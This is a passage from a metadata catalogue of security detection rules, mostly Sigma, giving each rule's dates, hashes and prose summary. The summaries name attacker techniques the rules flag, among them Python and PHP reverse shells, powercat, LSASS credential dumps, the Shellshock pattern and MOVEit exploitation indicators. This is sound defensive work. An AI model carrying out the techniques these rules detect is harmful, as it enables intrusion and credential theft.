  Rule-Body-Hash: 6c58bb4911fb2d245faccffc19839521
  Ruleset: sigmahq
  Summary: This rule detects the execution of rundll32.exe with a command line that
    lacks a common file extension, such as .cpl, .dll, or .inf. This condition suggests
    an anomaly since rundll32 normally executes files with these typical extensions.
    The rule identifies instances where the command line is either null, empty, or
    contains less common or unexpected extensions. Additional filters are applied
    to exclude legitimate cases, such as those related to known processes or update
    mechanisms like Microsoft Edge updates. These criteria help to reduce false positives
    and focus on potential malicious activity linked to defense evasion techniques.
  Updated-Date: '2024_09_04'
c3b2a774-3152-4989-83c1-7afc48fd1599:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 88ba19b53393a686ab2b90a045549137
  Ruleset: emerging-threats
  Summary: This rule detects file activity indicative of potential exploitation of
    the MOVEit Transfer software, specifically targeting the CVE-2023-34362 vulnerability.
    MOVEit Transfer is a managed file transfer software that could be exploited for
    unauthorized access and data theft. The rule identifies suspicious file modifications
    within the '\MOVEit Transfer\wwwroot\' directory, focusing on files with extensions
    commonly associated with scripts, archives, and executables such as '.7z', '.bat',
    '.dll', '.exe', '.ps1', '.rar', '.vbe', '.vbs', and '.zip'. Additionally, it looks
    for specific known file indicators like '\MOVEit Transfer\wwwroot\_human2.aspx.lnk'
    and '\MOVEit Transfer\wwwroot\human2.aspx'. The rule also includes a detection
    mechanism for compiled ASP.NET files created during the suspected exploitation
    timeframe from March to June 2023, particularly in shared temporary directories
    used by ASP.NET applications.
  Updated-Date: '2024_09_03'
c3cefdf4-6703-4e1c-bad8-bf422fc5015a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c41493982b44822bbdf3247a987cbfea
  Ruleset: sigmahq
  Summary: This rule detects changes to the registry values related to Outlook security
    settings on Windows systems. Monitoring these registry modifications is crucial
    because they can indicate attempts to alter security configurations, which could
    be leveraged by attackers to reduce the security posture of the Outlook application.
    This detection helps in identifying unauthorized changes that might facilitate
    persistence mechanisms, potentially compromising email security.
  Updated-Date: '2024_09_04'
c3d76afc-93df-461e-8e67-9b2bad3f2ac4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0bbd88f34c17f60b8653732226b91eec
  Ruleset: sigmahq
  Summary: This rule detects the execution of "cmd.exe" or similar utilities like
    "powershell.exe" or "pwsh.exe" initiating "explorer.exe" with command line arguments
    aimed at opening the "My Computer" folder. This activity can indicate an attempt
    to explore system drives and files, which is commonly associated with an initial
    reconnaissance phase in various cyber-attacks.
  Updated-Date: '2024_09_04'
c3dbbc9f-ef1d-470a-a90a-d343448d5875:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d0a35f58465e84a207b0e67e5f37a069
  Ruleset: sigmahq
  Summary: This rule detects non-browser processes interacting with the Telegram API,
    which could indicate the use of a covert Command and Control (C2) channel. It
    monitors network connections to 'api.telegram.org' and applies filters to exclude
    known browser applications that typically use Telegram, such as Chrome, Firefox,
    Edge, and others. If a process that is not among these known browsers attempts
    to connect to the Telegram API, it is flagged as suspicious. The rule aims to
    identify potential malicious activity where Telegram is used covertly for communication
    by an application that is not a browser.
  Updated-Date: '2024_09_04'
c3e5c1b1-45e9-4632-b242-27939c170239:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0e30b7e7f6ac4c8d772acb917426bb2e
  Ruleset: core
  Summary: This rule detects any Sysmon "FileBlockShredding" event, which signifies
    a violation of the configured shredding policy on a Windows system.
  Updated-Date: '2024_09_03'
c3e76af5-4ce0-4a14-9c9a-25ceb8fda182:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a00f62203dfc218b9022aba03de8a255
  Ruleset: core
  Summary: This rule detects WerFault creating a memory dump file associated with
    the LSASS process, potentially containing user credentials. The specific indicators
    include the creation of a file that contains "lsass" or "lsass.exe" in its name,
    which suggests the contents of the LSASS process memory. The detection is based
    on file events in Windows where the target filename matches these patterns.
  Updated-Date: '2024_09_03'
c3edc6a5-d9d4-48d8-930e-aab518390917:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 13ee46d7fea05661e0480cf1fc72f852
  Ruleset: core
  Summary: "This rule detects the creation of a new Outlook form, which can be utilized\
    \ to embed malicious code. Outlook forms are customizable forms within Microsoft\
    \ Outlook that can be exploited for persistence by injecting harmful scripts or\
    \ executables. The detection focuses on file events associated with the 'outlook.exe'\
    \ process and specifically monitors the creation of files within the application's\
    \ forms directory, typically located in the user\u2019s AppData or Local Settings\
    \ directories. This behavior may indicate attempts at establishing persistence\
    \ through Outlook forms, which poses significant security risks."
  Updated-Date: '2024_09_03'
c3f265c7-ff03-4056-8ab2-d486227b4599:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 58752bac2af72f1e7d191a404a2c5865
  Ruleset: core
  Summary: This rule detects the restoration of a new publicly accessible Amazon Web
    Services (AWS) Relational Database Service (RDS) instance from a snapshot. This
    activity may be indicative of a data exfiltration attempt, where an attacker exploits
    snapshot recovery to access and potentially steal data stored in the database.
    The rule specifically monitors events within AWS CloudTrail for the `RestoreDBInstanceFromDBSnapshot`
    action, ensuring that the restored database is publicly accessible.
  Updated-Date: '2024_09_03'
c4042d54-110d-45dd-a0e1-05c47822c937:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1f4427133631ab8a625e41835c31f864
  Ruleset: core
  Summary: This rule detects instances of Python spawning a pretty tty, which may
    suggest potential reverse shell activity. It monitors for specific Python images
    related to Python, Python2, or Python3 and scrutinizes command lines that import
    the pseudo-terminal (pty) module and utilize its spawn function. By focusing on
    this pattern, the rule aims to identify suspicious behavior that could indicate
    unauthorized access or malicious scripts attempting to create an interactive shell.
  Updated-Date: '2024_09_03'
c408acfe-2870-41df-8d2f-9f4daa4555ed:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1a9eefd7b410e97f948f332afe7d496b
  Ruleset: emerging-threats
  Summary: This rule detects the execution of commands utilizing "net.exe" or PowerShell
    to create a group named "ESX Admins," which indicates a potential exploitation
    attempt of CVE-2024-37085. This specific vulnerability allows an attacker to escalate
    privileges to full administrative access on an ESXi hypervisor that is joined
    to an Active Directory domain. VMware ESXi hypervisors treat any member of a domain
    group named "ESX Admins" as having full administrative access by default, which
    risky if leveraged by attackers.
  Updated-Date: '2024_09_03'
c420410f-c2d8-4010-856b-dffe21866437:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 644c1a545cadc214962a06faf624d077
  Ruleset: sigmahq
  Summary: This rule detects changes to the "NoLMHash" registry value, which allows
    Windows to store LAN Manager (LM) hashes of user passwords. By setting this value
    to "0" (DWORD), the system permits the storage of LM hashes in Active Directory
    and local Security Account Manager (SAM) databases. Storing LM hashes is generally
    considered insecure because these hashes can be more easily compromised than more
    modern hashing techniques. This detection can help identify potential security
    policy changes that enable the storage of less secure password hashes.
  Updated-Date: '2024_09_04'
c42a3073-30fb-48ae-8c99-c23ada84b103:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 21b86cfa8512a0a4cd3c927e2da1820f
  Ruleset: core
  Summary: This rule detects suspicious user agent strings commonly used by hacking
    tools in proxy logs. It identifies various tools employed for vulnerability scanning,
    brute force attacks, security assessments, SQL injection, and other malicious
    activities. Specific user agent strings include names of tools like 'hydra', 'arachni',
    'brutus', 'dirbuster', 'sqlmap', and many others. By monitoring these user agent
    patterns, the rule aims to identify and flag potential indicators of unauthorized
    access or malicious scanning activities within the network.
  Updated-Date: '2024_09_03'
c4568f5d-131f-4e78-83d4-45b2da0ec4f1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8fef10aa48ca110b0fcccc420d85c391
  Ruleset: sigmahq
  Summary: This rule detects an executable initiating a network connection to "LocaltoNet"
    tunneling sub-domains on a Linux system. LocaltoNet is a reverse proxy service
    that allows localhost services to be publicly accessible over the Internet. This
    service can be exploited by attackers for command-and-control activities, enabling
    them to bypass multi-factor authentication (MFA) and perimeter security controls.
  Updated-Date: '2024_09_04'
c462f537-a1e3-41a6-b5fc-b2c2cef9bf82:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2d5252acad854dd0147e65c8c099234a
  Ruleset: core
  Summary: This rule detects the execution of PsExec or PaExec with a renamed service
    name, which can help distinguish between legitimate usage of PsExec and potential
    misuse by attackers who might use alternative PsExec clients. The rule specifically
    monitors for events indicating access to the IPC$ share and the creation of certain
    standard input/output/error pipes, while filtering out cases where the service
    name starts with "PSEXESVC".
  Updated-Date: '2024_09_03'
c484e533-ee16-4a93-b6ac-f0ea4868b2f1:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b32454e8dc4d835c3788ff9335a5991a
  Ruleset: core
  Summary: This rule detects the execution of the SharpUp tool, which is used for
    local privilege escalation on Windows systems. It identifies instances where the
    `SharpUp.exe` image is executed, checking for specific command line arguments
    related to various privilege escalation techniques such as hijackable paths, unquoted
    service paths, process DLL hijacks, modifiable service binaries, modifiable scheduled
    tasks, domain group policy passwords, and cached group policy passwords.
  Updated-Date: '2024_09_03'
c4b890e5-8d8c-4496-8c66-c805753817cd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9093517bd969f48860c4384d2379a191
  Ruleset: sigmahq
  Summary: This rule detects potential process hollowing activity on Windows systems,
    where a memory process image does not match the disk image. Process hollowing
    is a technique used by malware to inject malicious code into the address space
    of another process by hollowing out its memory. This detection focuses on instances
    where the image type is flagged as replaced but excludes processes from common
    system directories and known applications like Opera and Microsoft Edge to minimize
    false positives.
  Updated-Date: '2024_09_04'
c4e06896-e27c-4583-95ac-91ce2279345d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dcccd7bb0e9abaafe2aadd074679641c
  Ruleset: core
  Summary: This rule detects potential XML External Entity (XXE) exploitation attempts
    in Java Virtual Machine (JVM) based applications. It focuses on identifying instances
    where XML parsing issues arise, as indicated by the presence of 'SAXParseException'
    or 'DOMException' in application error logs. These issues can potentially signify
    unsafe initialization of XML parsers, which could be exploited if not properly
    handled, posing initial access threats. It is essential to ensure proper parser
    initialization to mitigate this risk.
  Updated-Date: '2024_09_03'
c4e49831-1496-40cf-8ce1-b53f942b02f9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d47cf45714ae0482aa63eae485b4331d
  Ruleset: core
  Summary: This rule detects the execution of a renamed version of PAExec, which is
    often used by attackers for defense evasion. PAExec is a remote administration
    tool similar to PsExec and is sometimes renamed by legitimate users or attackers
    to obscure its presence. The detection criteria include specific file descriptions,
    original file names, product names, imphashes, and certain hash values. Additionally,
    there is a filter to exclude instances where PAExec is executed from its default
    directory or with filenames that start with a specific prefix, typical when used
    with the "-s" flag for system execution. False positives may include legitimate
    uses by system administrators or software companies that rename the tool.
  Updated-Date: '2024_09_03'
c4e92a97-a9ff-4392-9d2d-7a4c642768ca:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 012a7a77623b4af5c56169c7e70c14c9
  Ruleset: core
  Summary: This rule detects the installation of a service by an unusual client process,
    specifically identifying instances where the client process has a Process ID (PID)
    of 0 or its parent process has a PID of 0. The detection focuses on security logs
    for Event ID 4697, signaling potential privilege escalation or abuse through the
    creation of services under suspicious circumstances.
  Updated-Date: '2024_09_03'
c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 230002331f6bf526e10f81e809016c94
  Ruleset: core
  Summary: This rule detects the creation of scheduled tasks (`schtasks.exe`) that
    execute a Base64 encoded payload stored in the Windows Registry using PowerShell.
    The detection focuses on identifying command-line patterns associated with creating
    tasks (`/Create`), handling Base64 encoding (`FromBase64String` or `encodedcommand`),
    accessing registry properties (`Get-ItemProperty` or its alias `gp`), and referencing
    registry hives (e.g., `HKCU:` or `HKLM:`). The rule aims to identify potentially
    malicious activity where a scheduled task executes a script hidden in the registry
    to maintain persistence or facilitate further execution.
  Updated-Date: '2024_09_03'
c4ff1eac-84ad-44dd-a6fb-d56a92fc43a9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: acdfc7d3c7080370f6e7d1b6dc572ebc
  Ruleset: core
  Summary: This rule detects the ProcessHacker tool elevating its privileges to a
    very high level within a Windows system. It captures events where the Service
    Control Manager has an event with the ID 7045, indicating that a service name
    starting with "ProcessHacker" has been created or configured to run under the
    "LocalSystem" account, suggesting unauthorized privilege escalation.
  Updated-Date: '2024_09_03'
c52a914f-3d8b-4b2a-bb75-b3991e75f8ba:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f0d9b2969ca69629fe4b731f970e0a9e
  Ruleset: core
  Summary: This rule detects the use of binary padding techniques on Linux systems,
    which adversaries may employ to insert junk data and alter the on-disk appearance
    of malware. It identifies instances where the `dd` and `truncate` commands are
    used to add extraneous data to files, thereby attempting to mask malicious activities.
  Updated-Date: '2024_09_03'
c539afac-c12a-46ed-b1bd-5a5567c9f045:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 33403332b1ec675ae1124d16f46a867d
  Ruleset: core
  Summary: This rule detects a process initiating a network connection over ports
    5985 or 5986 from a non-network service account, potentially indicating a remote
    PowerShell connection. It filters out connections from known legitimate network
    services, localhost connections, and certain services like Avast antivirus software
    to reduce false positives. Legitimate use cases such as remote administration
    and monitoring or localized network service names not covered could result in
    false positives.
  Updated-Date: '2024_09_03'
c57872c7-614f-4d7f-a40d-b78c8df2d30d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b54ab263572aca80a94ef26c7aeca137
  Ruleset: sigmahq
  Summary: This rule detects calls to "LoadAssemblyFromPath" or "LoadAssemblyFromNS"
    within the "CL_LoadAssembly.ps1" PowerShell script, which can be exploited to
    load various assemblies and bypass AppLocker controls.
  Updated-Date: '2024_09_04'
c5a178bf-9cfb-4340-b584-e4df39b6a3e7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d203c44f9574d85cded9a18232270eb5
  Ruleset: emerging-threats
  Summary: This rule detects the deactivation and disabling of the Scheduled Defragmentation
    task on Windows systems, a technique observed in use by the Slingshot APT group.
    This action is identified by monitoring for specific event ID 4701 within the
    security logs, targeting the task name '\Microsoft\Windows\Defrag\ScheduledDefrag'.
    Such deactivation can signify an attempt to undermine system performance or security
    as part of a persistence strategy used by advanced persistent threats.
  Updated-Date: '2024_09_03'
c5b20776-639a-49bf-94c7-84f912b91c15:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5f19310cb85477844f10103b59302bd4
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell scripts that implement Netcat functionalities,
    particularly using "powercat" or "powercat.ps1". "Powercat" is a versatile networking
    tool that uses PowerShell to provide Netcat-like capabilities, which can be used
    by adversaries for command-and-control communication among infected hosts or with
    a C2 server, using non-application layer protocols.
  Updated-Date: '2024_09_04'
c5c00f49-b3f9-45a6-997e-cfdecc6e1967:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a5d83d1a612f28285a8f2577966aeaa2
  Ruleset: core
  Summary: This rule detects the creation of a scheduled task (schtask) that executes
    a file from the C:\Users\<USER>\AppData\Local directory on a Windows system. This
    behavior is potentially suspicious as it can indicate the presence of malware
    attempting to maintain persistence or execute unauthorized commands. Specific
    command line parameters are monitored, ensuring the detection is focused on misuse
    of the schtasks utility by unauthorized users or malicious software. The rule
    includes certain filters to exclude known false positives, such as operations
    related to TeamViewer installations, to reduce noise in detection results.
  Updated-Date: '2024_09_03'
c5f6a85d-b647-40f7-bbad-c10b66bab038:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: de623d26feab02933431813c86ef6596
  Ruleset: sigmahq
  Summary: This rule detects when an attacker attempts to disable User Account Control
    (UAC) notifications by modifying the "UACDisableNotify" value in the Windows Registry.
    UAC is an essential security feature in Windows that prompts users for permission
    or an administrator password before performing actions that could alter the system
    or affect other users. Setting "UACDisableNotify" to 1 suppresses these UAC prompts,
    circumventing this security measure.
  Updated-Date: '2024_09_04'
c601f20d-570a-4cde-a7d6-e17f99cb8e7f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ee06a5ed538e4f2e56e20baa38936332
  Ruleset: emerging-threats
  Summary: This rule detects automated lateral movement activities performed by the
    Turla group on Windows systems. Specifically, it identifies process creation events
    where malicious actors use commands to establish network connections to domain
    controllers and search for documents and executables on local and temporary directories.
    These behaviors are indicative of an attempt to move laterally within a network,
    discover sensitive information, and potentially deploy further malware payloads
    or exfiltrate data.
  Updated-Date: '2024_09_03'
c615d676-f655-46b9-b913-78729021e5d7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: af35bcf2e292a9874e3c1f1e39d4d4c7
  Ruleset: sigmahq
  Summary: This rule detects the execution of the BCP utility, which is used to export
    data from Microsoft SQL Server databases. Attackers have been observed saving
    their malware to a database column or table and subsequently extracting it using
    "bcp.exe" into a file. By monitoring for specific command-line arguments associated
    with data export operations via BCP, this rule aims to identify potential malicious
    activity involving data extraction from SQL Server databases.
  Updated-Date: '2024_09_04'
c61daa90-3c1e-4f18-af62-8f288b5c9aaf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7aa26a0204135eed421801e9e1077c18
  Ruleset: sigmahq
  Summary: This rule detects the creation of files with scripting or executable extensions
    by the MySQL daemon process. This activity could indicate the abuse of "User Defined
    Functions" (UDFs) to download and potentially execute malware. Extensions monitored
    include `.bat`, `.dat`, `.dll`, `.exe`, `.ps1`, `.psm1`, `.vbe`, and `.vbs`. Detecting
    such file creation by MySQL processes may help identify attempts to utilize UDFs
    for malicious purposes, which is a known tactic for compromising systems running
    MySQL.
  Updated-Date: '2024_09_04'
c625d754-6a3d-4f65-9c9a-536aea960d37:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 927db8c06315ac4fdd602dde01cf20bc
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "Accesschk" utility, an access and privilege
    audit tool developed by SysInternals that is often abused by attackers to verify
    process privileges. The rule identifies processes where the product ends with
    "AccessChk," descriptions containing "Reports effective permissions," and images
    ending with either "accesschk.exe" or "accesschk64.exe." It also flags specific
    command line arguments commonly associated with the tool, such as 'uwcqv', 'kwsu',
    'qwsu', and 'uwdqs'. Possible false positives include activities conducted by
    system administrators.
  Updated-Date: '2024_09_04'
c633622e-cab9-4eaa-bb13-66a1d68b3e47:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f4c734db3a52daeafa4e9cec101396a8
  Ruleset: sigmahq
  Summary: This rule detects the execution of "Tpmvscmgr.exe" with the intent to create
    a new virtual smart card. "Tpmvscmgr.exe" is a command-line utility in Windows
    used for managing Trusted Platform Module (TPM) virtual smart cards. By monitoring
    process creation logs, this rule identifies instances where the executable is
    launched, specifically looking for commands that include 'create', which indicates
    the creation of a new virtual smart card. While legitimate administrator usage
    may trigger this rule, it primarily serves to flag potentially unauthorized or
    suspicious activities involving virtual smart card creation.
  Updated-Date: '2024_09_04'
c6438007-e081-42ce-9483-b067fbef33c3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 48c2b56929cd3248b20d5a06e8b8604b
  Ruleset: sigmahq
  Summary: This rule detects suspicious PowerShell activity that may indicate timestomping,
    a technique used by adversaries to modify file time attributes to hide new or
    altered files. The detection specifically looks for PowerShell script blocks containing
    commands that set file creation, last write, and last access times.
  Updated-Date: '2024_09_04'
c649a6c7-cd8c-4a78-9c04-000fc76df954:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: db6ce5420109602ff79ac5ccbf47ab9d
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious network connections initiated
    by the Windows Update Client binary (wuauclt.exe) using the command parameter
    "/RunHandlerComServer." The rule aims to identify instances where wuauclt.exe
    is used to proxy code execution through DLL (Dynamic Link Library) spawning a
    new process and injecting it to establish network connections. Various IP address
    ranges, including private, loopback, and Microsoft-owned IP addresses, are filtered
    out to reduce false positives. This behavior may indicate a defense evasion technique
    associated with malicious activities.
  Updated-Date: '2024_09_04'
c64c5175-5189-431b-a55e-6d9882158251:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dcf79c340b394c490a21253015e1b4ba
  Ruleset: sigmahq
  Summary: This rule detects suspicious DNS queries to api.telegram.org, which is
    associated with the Telegram Bot API. Such queries may indicate the use of Telegram
    Bots, potentially related to malicious activities, such as those described in
    cases like TeleRAT targeting Iranian users, Telecrypt ransomware, and disruptive
    TeleBots using the KillDisk attacks.
  Updated-Date: '2024_09_04'
c6714a24-d7d5-4283-a36b-3ffd091d5f7e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 126b32714f4cb0a01c662ea7ad2d823f
  Ruleset: core
  Summary: This rule detects the usage of the PHP command-line interface (CLI) with
    the "-r" flag, which allows the execution of inline PHP code. Specifically, it
    looks for calls to the "fsockopen" function, which is used for creating network
    sockets. Attackers often utilize this function along with other functions like
    "exec" or "fopen" to establish a reverse shell connection, enabling them to gain
    unauthorized control over the system. The rule focuses on process creation logs
    on Linux systems to identify such potentially malicious activities.
  Updated-Date: '2024_09_03'
c67e0c98-4d39-46ee-8f6b-437ebf6b950e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2842f5abcf4ccc5ca33b6d49354e228d
  Ruleset: core
  Summary: This rule detects potential Shellshock expressions in Linux log files.
    Shellshock is a security vulnerability in the Bash shell that allows attackers
    to execute arbitrary commands on an affected system. The rule searches for specific
    patterns, such as '(){:;};' and its variations, within the log files to identify
    possible exploitation attempts.
  Updated-Date: '2024_09_03'
c67fc22a-0be5-4b4f-aad5-2b32c4b69523:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5711bebea88bdeac5481299ef13b3383
  Ruleset: core
  Summary: This rule detects suspicious command lines that attempt to create symbolic
    links to the /etc/passwd file on Linux systems. The /etc/passwd file is a critical
    system file containing user account information, and unauthorized manipulation
    of this file may indicate malicious activities or exploitation attempts. Specifically,
    the rule identifies command lines using 'ln' with flags '-s' and optionally '-f'
    to create these symbolic links, which could be leveraged by attackers to divert
    or manipulate authentication processes.
  Updated-Date: '2024_09_03'
c6c56ada-612b-42d1-9a29-adad3c5c2c1e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 42b8622233d43bb09bb58d1cbf510f32
  Ruleset: core
  Summary: This rule detects tampering with audit policy settings using the older
    version of the auditpol utility from the NT Resource Kit. Threat actors may use
    this utility to selectively disable or remove certain audit policies, thereby
    impairing detection capabilities. The suspicious command lines monitored include
    actions to disable logging for various system components.
  Updated-Date: '2024_09_03'
c6fb44c6-71f5-49e6-9462-1425d328aee3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1ecb609c59c8b82f55fb33759ac13b70
  Ruleset: core
  Summary: This rule detects base64 encoded PowerShell commands that utilize the "MpPreference"
    cmdlet to modify or tamper with Windows Defender Antivirus settings. Specifically,
    it searches for encoded commands such as "Add-MpPreference" and "Set-MpPreference,"
    which are indicative of potential attempts to alter security configurations. By
    monitoring these encoded strings, the rule aims to identify suspicious activity
    that could be associated with defense evasion tactics.
  Updated-Date: '2024_09_03'
c708a93f-46b4-4674-a5b8-54aa6219c5fa:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5bd5401dc8c2282a26ef9f5f43fce35c
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a file named "dllhost.exe" in the "C:\users\public\Documents\"
    directory. This behavior has been observed in some variants of the COLDSTEEL Remote
    Access Trojan (RAT), a type of malware used for unauthorized remote access to
    compromised systems. The rule monitors file events on Windows systems, specifically
    targeting this filename and location to identify potential threats.
  Updated-Date: '2024_09_03'
c70e019b-1479-4b65-b0cc-cd0c6093a599:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9e22c4356b5f50a5b9cad0b6b9894599
  Ruleset: core
  Summary: This rule detects instances where PowerShell is invoked from an executable
    using a version mismatch method. It specifically looks for discrepancies between
    the engine version and host version of PowerShell, such as an engine version of
    2, 4, or 5 being run with a host version of 3. This activity is often associated
    with defense evasion and unauthorized execution tactics.
  Updated-Date: '2024_09_03'
c72aca44-8d52-45ad-8f81-f96c4d3c755e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8e6253de269f8b3d6485ddb0f2129dcf
  Ruleset: core
  Summary: This rule detects obfuscated PowerShell activity by monitoring for specific
    patterns in scripts that are executed via standard input. The detection focuses
    on the use of certain commands and variable manipulation often associated with
    obfuscation techniques in PowerShell scripts. Such patterns include the setting
    of variables and invoking commands that manipulate the environment or input, which
    can be indicative of an attempt to obscure the true intent of the script. This
    technique is commonly linked to defense evasion and execution tactics.
  Updated-Date: '2024_09_03'
c73124a7-3e89-44a3-bdc1-25fe4df754b1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 216909a7b06db65158049e1744aedb00
  Ruleset: core
  Summary: This rule detects the execution of the built-in "copy" command targeting
    a Volume Shadow Copy on Windows systems. This command is sometimes used maliciously
    to copy registry hives that are currently in use. The presence of this command
    in the process creation logs indicates potential unauthorized access or data extraction
    activities. It specifically looks for command lines containing the "copy" command
    followed by a path that includes "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy".
    This activity could indicate an attempt to dump domain password hashes or other
    sensitive information from shadow copies.
  Updated-Date: '2024_09_03'
c740d4cf-a1e9-41de-bb16-8a46a4f57918:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5cbbd908bf2c66e4c6404963de1adf44
  Ruleset: sigmahq
  Summary: This rule detects the usage of the PowerShell cmdlet "Enable-WindowsOptionalFeature,"
    which functions similarly to DISM.exe for managing Windows features and packages.
    It specifically identifies the enabling of certain potentially insecure or unusual
    features such as TelnetServer, Internet-Explorer-Optional-amd64, TFTP, SMB1Protocol,
    Client-ProjFS, and Microsoft-Windows-Subsystem-Linux. Legitimate usage of these
    features might occur but is typically less common.
  Updated-Date: '2024_09_04'
c74c0390-3e20-41fd-a69a-128f0275a5ea:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: de18c94004b21ba1ba357ee3b09329c2
  Ruleset: core
  Summary: This rule detects the execution of "wusa.exe" (Windows Update Standalone
    Installer) being used to extract ".cab" files via the "/extract" argument from
    potentially suspicious paths. It monitors specific directories such as ':\PerfLogs\',
    ':\Users\Public\', ':\Windows\Temp\', and '\Appdata\Local\Temp\' for this activity,
    as files being extracted to these locations may indicate malicious behavior.
  Updated-Date: '2024_09_03'
c74d7efc-8826-45d9-b8bb-f04fac9e4eff:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9bb69ee961e37edc32e08ba4dcf291a2
  Ruleset: sigmahq
  Summary: This rule detects the configuration of the Run Once registry key, which
    can be executed by `runonce.exe` using the `/AlternateShellStartup` parameter.
    The specific registry key being monitored is located under `\Microsoft\Active
    Setup\Installed Components` and targets keys ending with `\StubPath`. Filters
    are included to exclude legitimate modifications by Google Chrome and Microsoft
    Edge installation processes, which have specific paths and command-line parameters
    in the Details field. This monitoring aims to identify potential defense evasion
    tactics where malicious payloads may be set to execute only once during system
    startup via this registry mechanism.
  Updated-Date: '2024_09_04'
c7746f1c-47d3-43d6-8c45-cd1e54b6b0a2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5073c5a1b412af0aa840884ff7a97bba
  Ruleset: sigmahq
  Summary: This rule detects the execution of LiveKD tool with the "-m" flag, which
    is used to potentially dump the kernel memory. LiveKD is a utility that allows
    the use of Microsoft kernel debuggers to examine live systems. The detection focuses
    on specific executable names and command line arguments associated with this activity.
  Updated-Date: '2024_09_04'
c7942406-33dd-4377-a564-0f62db0593a3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ebc5ba2772935d54a13aa7dcad6bec6b
  Ruleset: sigmahq
  Summary: This rule detects a change in the code page via the command line or batch
    scripts to less common languages. Specific code pages monitored include 936 for
    Chinese and 1258 for Vietnamese. This activity may indicate an attempt to evade
    detection by using uncommon languages in scripts.
  Updated-Date: '2024_09_04'
c79da740-5030-45ec-a2e0-479e824a562c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
